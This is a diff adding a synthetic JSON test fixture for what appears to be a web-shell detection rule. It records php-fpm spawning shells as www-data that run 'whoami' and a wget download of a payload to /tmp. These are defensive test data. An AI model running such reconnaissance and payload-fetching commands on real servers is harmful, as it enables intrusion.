@@ -1,0 +1,28 @@
+{
+  "label": "malicious",
+  "variant": "php-fpm ParentBaseFileName -> sh recon + curl",
+  "source": "synthetic",
+  "expect_alert": true,
+  "result": "not run",
+  "synthetic": true,
+  "events": [
+    {
+      "#event_simpleName": "ProcessRollup2",
+      "ParentBaseFileName": "php-fpm",
+      "ImageFileName": "/usr/bin/sh",
+      "CommandLine": "/bin/sh -c whoami",
+      "UserName": "www-data",
+      "ComputerName": "web1",
+      "aid": "a1"
+    },
+    {
+      "#event_simpleName": "ProcessRollup2",
+      "ParentBaseFileName": "php-fpm",
+      "ImageFileName": "/usr/bin/sh",
+      "CommandLine": "/bin/sh -c wget http://127.0.0.1/p -O /tmp/p",
+      "UserName": "www-data",
+      "ComputerName": "web1",
+      "aid": "a1"
+    }
+  ]
+}
